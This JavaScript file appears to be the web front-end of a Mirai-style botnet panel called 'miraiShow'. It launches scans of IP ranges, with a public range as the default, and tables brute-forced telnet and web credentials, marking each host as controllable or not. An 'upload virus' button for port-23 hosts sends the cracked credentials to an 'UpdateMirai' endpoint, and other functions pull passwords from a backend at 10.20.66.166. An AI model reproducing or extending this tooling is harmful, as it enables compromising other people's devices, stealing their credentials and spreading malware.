function test(args) {
		var array1=new Array();
		array1 = args.split(",");
		var array2=new Array();
		array2 = array1[0].split(":");
		$.ajax({
					type: "post",
					url: "UpdateMirai",
					data: {
						"url": array2[0],
						"port": array2[1],
						"username": array1[1],
						"password": array1[2],
					}
				}).done(function(data) {
						alert(data);
				})
	}

function test2(args) {
	array2 = args.split(":");
	var port = array2[1];
	if(port==80){
	$.ajax({
				type: "post",
				url: "http://10.20.66.166:8887/doit?ip=" + array2[0],
				data: {
				}
			}).done(function (data) {
				var username = data.username;
				var password = data.password;
				alert("用户名：" + username + "\n" + "密 码：" + password);
			})
	}
	if(port==8080){
		/*$.ajax({
			type: "post",
			//url: "http://10.20.66.166:8887/doit?ip=" + array2[0],
			url: args,
			data: {
			}
		}).done(function (data) {
			var username = data.username;
			var password = data.password;
			alert("用户名：" + username + "\n" + "密 码：" + password);
		})*/
		window.open("http://"+args);
	}
	
}

function test3(args) {
	array2 = args.split(":");
	window.location.href="http://10.20.66.166:8887/doit?ip=" + array2[0];
}

function startScan(par) { //0 scan 1 history
//获取要显示的类名
	function getShowClass() {
		var defaultclass = []
		if (result == 1) {
			defaultclass.push("success")
		}
		if (result == 2) {
			defaultclass.push("fail")
		}
		if (control == 1) {
			defaultclass.push("controlable")
		}
		if (control == 2) {
			defaultclass.push("controlless")
		}
		if (port == 1) {
			defaultclass.push("port80")
		}
		if (port == 2) {
			defaultclass.push("port23")
		}
		if (port == 3) {
			defaultclass.push("port8080")
		}
		// alert(defaultclass.join('.'))
		return defaultclass
	}
//筛选显示
	function showClass() {
		var defaultclass = getShowClass().join(".");
		tbody.children('.item').hide();
		if (defaultclass != "") {
			defaultclass = "." + defaultclass
		}
		tbody.children('.item' + defaultclass).show();
	}
	function diffDataToRender(newData) { //oldData: 为闭包的变量;
		var data = [];
		data = newData.splice(oldData.length);
		oldData = oldData.concat(data);
		renderToTable(data);
		EnterFace[par].ipsarr=oldData;
		if(EnterFace[par].ChartArg){
			EnterFace[par].ChartArg.ipsarr=oldData;
			EnterFace[par].ChartArg.wakeup();
		}
		if(par == 1){
//			Urls.download = "text.json";
			var daochuDoc  = $('#daochu')[0];
			daochuDoc.className = daochuDoc.className.replace(/btn\-default/,"btn-info");
			$("#daochu")[0].onclick=function(){
				var table=document.getElementsByClassName("form-control");
				var starttime=encodeURI(table.start.value);
				var endtime=encodeURI(table.end.value);
				this.download = "ip导出_from_"+starttime+"_to_"+endtime ;
				this.href = "data:text/plain," + JSON.stringify(oldData);
			}
		}
	//	wakeup
	}
	function getScanResult(surl) {//获得指向闭包函数的引用; //会有突变问题;
		var time=startScan[par].times;
		 $.ajax({
		 		url: surl,
		 		dataType: 'json',
		 		success: function(data) {
		 			/*不是json时*/
	//	 			var parseData = data.map(function(item) {
	//	 				var arrSplit = item.split(',');
	//	 				return {
	//	 					result: arrSplit[4],
	//	 					banner: '六神',
	//	 					ip: arrSplit[0],
	//	 					username: arrSplit[2],
	//	 					pwd: arrSplit[3],
	//	 					kind: arrSplit[5],
	//	 					control: arrSplit[4],
	//	 					address: arrSplit[6]
	//	 				}
	//	 			})
	//				var parseData =JSON.parse(data)
					if(time!=startScan[par].times) return;
		 			diffDataToRender(data);
		 			/*添加控制表头和表格内容对齐*/
		 			addPdding();
		 			if(par==1){
		 				showmessage("历史记录加载完成");
		 			}
		 		},
		 		error:function (e){
//		 			showmessage(surl);
					console.log(surl);
		 			showmessage("无法获得历史记录",e.status+':'+e.statusText,1);
		 		}
		 	})
//		diffDataToRender(json.data,par);
//		addPdding(par);
	}	
	function addPdding() {
		var item = tbody.children().length,
			itemHeigt = 39,
			spill = tbody[0].offsetHeight - 10 < item * itemHeigt;
		if (spill) {
			thead.css('padding-right', '20px')
		} else {
			thead.css('padding-right', '0px')
		}
	}
	function renderToTable(data) {
		for (var i = 0; i < data.length; i++) {
			var item = $('<div class="item"><span class="span-0"></span><span class="span-1"></span><span class="span-2"></span><span class="span-3"></span><span class="span-4"></span><span class="span-5"></span><span class="span-6"></span><span class="span-7"></span><span class="span-9"></span><span class="span-8"></span></div>')
			var temp = ""
			var temp2=""
			var controlClass = ""
	//		if (data[i].control == "可控制") {
	//			item.addClass('controlable')
	//		}
	//		if (data[i].control == "不可控制") {
	//			item.addClass('controlless')
	//		}
			if (data[i].result == '1') {
				item.addClass('success')
				item.addClass('controlable')
				data[i].control="可控制"
				controlClass =  "controlbutton_yes"
				temp = "<i style='color:#0BDB24' class='glyphicon glyphicon-ok'></i>&nbsp;成功"
					
				var args2 = "'" + data[i].ipport + "'"
				temp2='<i title = "查看"  class="controlbutton_see glyphicon glyphicon-eye-open" aria-hidden="true"></i><i  title = "控制" class="controlbutton_yes  glyphicon glyphicon glyphicon-globe" aria-hidden="true" onclick="test2('+args2 +')"></i>'
			} else {
				item.addClass('fail')
				item.addClass('controlless')
				data[i].control="不可控制"
				controlClass =  "controlbutton_no"
				temp = "<i style='color:#F51143' class='glyphicon glyphicon-remove'></i>&nbsp;失败"
				temp2='<i   title = "查看" class="controlbutton_see glyphicon glyphicon-eye-open" aria-hidden="true" ></i><i  title = "控制" class="controlbutton_no  glyphicon glyphicon glyphicon-globe" aria-hidden="true" ></i>'
			}
			if (data[i].ipport.slice(-3) == ":80") {
				item.addClass('port80')
			}
			if (data[i].ipport.slice(-3) == ":23") {
				item.addClass('port23')
				var args = "'" + data[i].ipport+","+data[i].username+","+data[i].pwd + "'";
				//23端口的上传病毒;
				temp2 += '<i title = "上传病毒" class="controlbutton glyphicon glyphicon glyphicon-screenshot" aria-hidden="true"  onclick="test('+args +')"></i>'
			}
			if (data[i].ipport.slice(-5) == ":8080") {
				item.addClass('port8080')
			}
			item.children('.span-0').html(temp)
			item.children('.span-1').text(data[i].banner != "" ? data[i].banner : "--")
			item.children('.span-2').text(data[i].ipport != "" ? data[i].ipport : "--")
			item.children('.span-3').text(data[i].username != "" ? data[i].username : "--")
			item.children('.span-4').text(data[i].pwd != "" ? data[i].pwd : "--")
			item.children('.span-5').text(data[i].time != "" ? data[i].time : "--")
			item.children('.span-6').text(data[i].control != "" ? data[i].control : "--")
			item.children('.span-7').text(data[i].ipaddress != "" ? data[i].ipaddress : "--").attr("title",data[i].address)
			item.children('.span-8').html(temp2);
			item.children('.span-9').text(data[i].loophole != "" ? data[i].loophole : "--")
			var defaultclass = getShowClass()
			for (var j = 0; j < defaultclass.length; j++) {
				if (!item.hasClass(defaultclass[j])) {
					item.hide();
					break;
				}
			}
			tbody.prepend(item)
		}
	}
	var ipSection = $('#scan_ip').val() || "180.209.64.38/23";
	var ip = encodeURI(ipSection.split("/")[0]);
	var mask = encodeURI(ipSection.split("/")[1]);
	var tbody = TempStore.tbody[par];
	var thead = TempStore.thead[par];
	var oldData=[];
	var result,control,port;
	$('#resultSel'+par).on('change', function(e) { //筛选;
		result = e.target.value;
		showClass();
	});
	$('#controlSel'+par).on('change', function(e) {
		control = e.target.value;
		showClass();
	});
	$('#IPSel'+par).on('change', function(e) {
		port = e.target.value;
		showClass();
	});
	TempStore.ttype=TempStore.ttype||0;
	Urls.uploadfile="/miraiShow/StartScanServlet?ip=" + ip + "&mask=" + mask+"&Type="+TempStore.ttype;
	// Urls.uploadfile="./test.json";
	console.log(ip, '-----', mask)
	clearInterval(scanTimer);
	startScan[par].times++;
	switch(par){
		case 0:
		if(TempStore.ttype==0){
		 $.ajax({
		 	url: Urls.uploadfile,
		 	success: function(data) {
		 		$('.spinner').show(1000);
		 		window.scanTimer = setInterval(function() {
					console.log('刷新一次');
					getScanResult(Urls.getScan);
				}, 2000);
		 		showmessage('后台正在攻破中');
		 	},
		 	error: function(e) {
		 		showmessage("无法开始扫描!",e.status+':'+e.statusText,1);
		 	}
		 })
		}else{
			ClickFunc.initTimer=function (){ //重写函数实现跨越闭包协作;
				window.scanTimer = setInterval(function() {
					console.log('刷新一次');
					getScanResult(Urls.getScan);
				}, 2000);
		 		showmessage('后台正在攻破中(使用用户指定密码本)');
			}
		}
		break;
		case 1:
//		$.ajax({
//			url:"/miraiShow/GetHistoryServlet?starttime="+starttime+"&endtime="+endtime+"&ip="+ip+"&port="port,
//			success:function (data){
//				getScanResult();
//				showmessage("History done!");
//			},
//			error:function (){
//				showmessage("Get history fail!");
//			}
//		});
		if(Urls.History)getScanResult(Urls.History);
		break;
	}
	//getScanResult();
}
//MyEvent.fileloaded=function (filedata,dropbox){
////	ClickFunc.savefile=function (){
////		$.ajax({
////		    type: "POST",
////		    timeout: 50000,
////		    url: Urls.uploadfile,
////		    dateType:"json",
////		    data: TempStore.keysjson,
////		    success: function (data) {
////		        showmessage("OK");
////		    },
////		    error: function (e){
////		    	showmessage("Can't Save Now!");
////		    	console.log(e);
////		    }
////		});
////	}
//	var table=rew(filedata);
//	TempStore.keysjson=createjson(table);
//	createtable(table,dropbox);
//	ClickFunc.savefile=function (){
//		$.ajax({
//		    type: "POST",
//		    url: Urls.uploadfile+"&txt="+encodeURI(filedata),
//		    success: function (data) {
//		    	ClickFunc.initTimer();
//		        showmessage("OK");
//		    },
//		    error: function (e){
//		    	debugger;
//		    	showmessage("Can't Upload File!",e.status+':'+e.statusText,1);
//		    	console.log(e);
//		    }
//		});
//	}
//	TempStore.ttype=1;
//};
	// 模态框绑定事件
/* 添加事件监听函数 */
function addListener() {
//	$(window).on('resize', addPdding);
	$('#startScan').on('click', function() {
		console.log('开始扫描');
		TempStore.tbody[0] = $('.scan-page .tbody');
		TempStore.thead[0] = $('.scan-page .thead');
		TempStore.tbody[0].empty();
		EnterFace[0].ipsarr=[];
		EnterFace[0].ChartArg = null;
		// Urls.getScan='./test.json';
		Urls.getScan='/miraiShow/GetScanResultServlet';
		startScan(0);
	});
	$('#stopScan').on('click', function() {
		console.log('停止扫描');
		if(scanTimer!=undefined) clearInterval(scanTimer);
		$('.spinner').hide(1000);
	});
	$('#historybt').on('click',function (){
		TempStore.tbody[1] = $('.history-page .tbody');
		TempStore.thead[1] = $('.history-pagee .thead');
		TempStore.tbody[1].empty();
		var table=document.getElementsByClassName("form-control");
		var starttime=encodeURI(table.start.value);
		var endtime=encodeURI(table.end.value);
		var ip=encodeURI(table.ip.value);
		var port=encodeURI(table.port.value);
		Urls.History="/miraiShow/GetHistoryServlet?starttime="+starttime+"&endtime="+endtime+"&ip="+ip+"&port="+port;
//		Urls.History = "test.json";
		EnterFace[1].ipsarr = [];
		EnterFace[1].ChartArg = null;
		startScan(1);
	});

}

function init() {
	/*获取扫描数据*/
	// getScanResult();
	/*添加监听*/
	TempStore.tbody=[];
	TempStore.thead=[];
	Event.scan=[{},{}];
	addListener();
}
// 全局的:
var is_listeningScan=false;
var scanTimer;
startScan[0]={times:0};
startScan[1]={times:0};
startScan.itemInfo = initEnterFace($("#enterface_container"),$("#models").find(".enterface")[0]);
//startScan.daochu = initEnterFace($("#enterface_container"),$("#models").find(".enterface")[0]);
startScan.itemInfo.$content.addClass("Ycenter");
init();

